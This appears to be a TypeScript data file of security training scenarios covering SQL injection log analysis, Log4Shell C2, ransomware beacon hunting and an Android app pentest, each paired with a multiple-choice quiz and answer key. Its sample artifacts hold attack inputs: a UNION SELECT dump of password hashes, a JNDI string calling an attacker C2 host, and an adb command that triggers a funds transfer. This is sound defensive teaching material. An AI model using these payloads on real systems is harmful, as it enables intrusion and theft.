export interface IncidentScenario {
  id: string;
  category: "Log Analysis" | "Threat Hunting" | "Mobile Pentest" | "Cloud Assurance";
  title: string;
  target: string;
  severity: "Critical" | "High" | "Medium";
  scenarioSummary: string;
  attackPattern: string;
  investigationSteps: string[];
  sampleLogOrArtifact: string;
  verificationChallenge: {
    question: string;
    options: string[];
    correctAnswer: number;
    explanation: string;
  };
}

export const INCIDENT_PRACTICALS: IncidentScenario[] = [
  {
    id: "inc-1",
    category: "Log Analysis",
    title: "SQL Injection Recon & Customer Data Dump",
    target: "Meridian Retail Group",
    severity: "Critical",
    scenarioSummary:
      "Interleaved across 2,500 lines of web server logs, an attacker initiated blind Boolean SQL injection probes before executing UNION-based extracts against the customer checkout API.",
    attackPattern: "OWASP A03:2021 - Injection (SQLi) -> Authentication Bypass -> Exfiltration",
    investigationSteps: [
      "Filter logs by HTTP 200 responses containing SQL syntax characters (', --, UNION, SELECT).",
      "Isolate high-frequency requests originating from malicious proxy IPs in the auth headers.",
      "Identify the database schema extraction phase through length-testing HTTP responses.",
      "Verify unauthorized session tokens issued without credential validation.",
    ],
    sampleLogOrArtifact: `192.0.2.45 - - [14/Aug/2026:14:22:01 +0300] "GET /api/v1/items?cat=1' UNION SELECT null,username,password_hash FROM users-- HTTP/1.1" 200 4812 "-" "sqlmap/1.7.2#stable"
192.0.2.45 - - [14/Aug/2026:14:22:04 +0300] "POST /api/v1/auth/login HTTP/1.1" 200 312 "admin'--" "Mozilla/5.0"`,
    verificationChallenge: {
      question: "Which log indicator confirms successful database enumeration rather than merely an attempted probe?",
      options: [
        "A 404 Not Found response code",
        "A sudden jump in response byte size (e.g. 4812 bytes) accompanied by repeated HTTP 200 returns",
        "A User-Agent header claiming to be Safari",
        "A DNS lookup error in syslog",
      ],
      correctAnswer: 1,
      explanation:
        "When an attacker successfully extracts table data using UNION SELECT, the response payload size spikes noticeably compared to standard single-record responses, returning HTTP 200 with table rows.",
    },
  },
  {
    id: "inc-2",
    category: "Log Analysis",
    title: "JNDI Remote Execution & Outbound C2 Traffic",
    target: "Vantage Cloud Systems",
    severity: "Critical",
    scenarioSummary:
      "A nested JNDI string `${jndi:ldap://...}` was fed into a customer support telemetry header, triggering arbitrary Java class deserialization and spawning an outbound reverse shell.",
    attackPattern: "Log4Shell / Deserialization -> In-Memory Webshell -> Outbound Command & Control",
    investigationSteps: [
      "Inspect inbound headers (X-Forwarded-For, User-Agent, Referer) for obfuscated JNDI expressions.",
      "Correlate web log timestamps with outbound firewall connection logs on non-standard egress ports.",
      "Check `/tmp` and `/dev/shm` on Linux hosts for executable ELF drops or hidden reverse bash processes.",
      "Terminate rogue TCP socket connections and revoke IAM role instance metadata credentials.",
    ],
    sampleLogOrArtifact: `203.0.113.89 - - [18/Aug/2026:03:14:22 +0300] "POST /support/feedback HTTP/1.1" 500 892 "\${jndi:ldap://attacker-c2.net:1389/Exploit}" "Mozilla/5.0"
[FIREWALL ALERT] Outbound TCP 10.0.4.12:49821 -> 198.51.100.22:4444 (ESTABLISHED) [PROTO=SHELL]`,
    verificationChallenge: {
      question: "Why do attackers commonly use ports like 443 or 53 for their reverse shells instead of port 4444?",
      options: [
        "Port 443 is faster than port 4444",
        "Standard corporate egress firewall policies frequently allow outbound 443 (HTTPS) and 53 (DNS) while blocking 4444",
        "Port 4444 requires root privileges on the attacker server",
        "Linux kernels block port 4444 by default",
      ],
      correctAnswer: 1,
      explanation:
        "Egress filtering in modern networks often blocks arbitrary high ports like 4444, so seasoned adversaries route C2 traffic through permitted outbound ports (443 HTTPS or 53 DNS tunneling) to evade perimeter blocks.",
    },
  },
  {
    id: "inc-3",
    category: "Threat Hunting",
    title: "Atlas Continental PCAP: 'The Gentlemen' Ransomware Hunt",
    target: "Atlas Continental Corporation (Global PCAP)",
    severity: "Critical",
    scenarioSummary:
      "Spear phishing dropped malware that traversed Chicago, Berlin, and Johannesburg offices. Attackers exfiltrated 600TB, demanded $5M in Bitcoin, negotiated down to $1.25M, sent a decryptor, yet maintained persistent stealth C2 beacons.",
    attackPattern: "Spear Phishing -> Lateral SMB/WMI Movement -> Data Exfil -> Dark Web BTC Negotiation -> Hidden Secondary Beacon",
    investigationSteps: [
      "Analyze PCAP stream for abnormal TLS Handshakes with self-signed SNI certificates.",
      "Detect internal SMB psexec traffic moving laterally across subnets.",
      "Reconstruct HTTP and WebSockets negotiation session over Tor proxy bridge.",
      "Isolate the covert secondary heartbeat transmitting 64-byte beacon packets every 300 seconds to an unlisted IP.",
    ],
    sampleLogOrArtifact: `FRAME 41029: 10.20.1.4 -> 198.51.100.99 [TLSv1.2] Client Hello (SNI: cdn-telemetry-update.org)
FRAME 41030: 10.20.1.4 -> 198.51.100.99 [TCP] PUSH (Data: 64 bytes) [BEACON INTERVAL: 300.02s]
PAYLOAD DECRYPT: {"status":"active","target":"AF-JHB-DC01","beacon_id":"GENTLE-ALPHA-77"}`,
    verificationChallenge: {
      question: "In packet hunting, what distinguishing trait unmasks a covert beaconing malware despite jitter?",
      options: [
        "Packets always contain plain text passwords",
        "Periodic mathematical clustering of packet timestamps and uniform small payload sizes over long timeframes",
        "The malware always sends ICMP ping packets exclusively",
        "The MAC address changes randomly every second",
      ],
      correctAnswer: 1,
      explanation:
        "Automated C2 beacons follow periodic schedule intervals (even when applying ±10% sleep jitter). Time-delta statistical analysis reveals clear mathematical clusters and consistent packet lengths.",
    },
  },
  {
    id: "inc-4",
    category: "Mobile Pentest",
    title: "VulnBank Android Assessment: Exported Components & Insecure Storage",
    target: "VulnBank Android App (Beetlebug Labs)",
    severity: "High",
    scenarioSummary:
      "Assessment of VulnBank.apk identified exported Activities without permissions, sensitive credentials stored in plain text SharedPreferences, and SQLite injection in custom ContentProviders.",
    attackPattern: "Android Insecure Data Storage + Exported Components (LPE) + WebView JavascriptInterface",
    investigationSteps: [
      "Decompile APK using JADX-GUI and inspect AndroidManifest.xml for `android:exported=\"true\"`.",
      "Check `/data/data/com.vulnbank.app/shared_prefs/` for unencrypted API tokens and PINs.",
      "Audit custom ContentProviders using adb command `adb shell content query --uri content://com.vulnbank.provider/accounts`.",
      "Exploit WebView JavascriptInterface to read local files via `file:///android_asset/` injection.",
    ],
    sampleLogOrArtifact: `<!-- AndroidManifest.xml Excerpt -->
<activity android:name=".ui.TransferFundsActivity" android:exported="true">
    <intent-filter>
        <action android:name="com.vulnbank.action.TRANSFER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
<!-- Resulting adb exploit: -->
adb shell am start -n com.vulnbank.app/.ui.TransferFundsActivity --es recipient "attacker_acc" --ef amount 9999.00`,
    verificationChallenge: {
      question: "How should an Android developer protect an internal Activity from being invoked by arbitrary third-party malicious apps?",
      options: [
        "Set android:exported=\"false\" or enforce custom permissions with signature-level protection",
        "Rename the package name to start with .internal",
        "Obfuscate the Java source code with ProGuard without changing the manifest",
        "Save the customer PIN into a JSON file in the Downloads folder",
      ],
      correctAnswer: 0,
      explanation:
        "Setting `android:exported=\"false\"` prevents other applications from launching the Activity directly. If inter-app communication is needed, custom permissions with `protectionLevel=\"signature\"` ensure only apps signed with the same developer key can invoke it.",
    },
  },
];
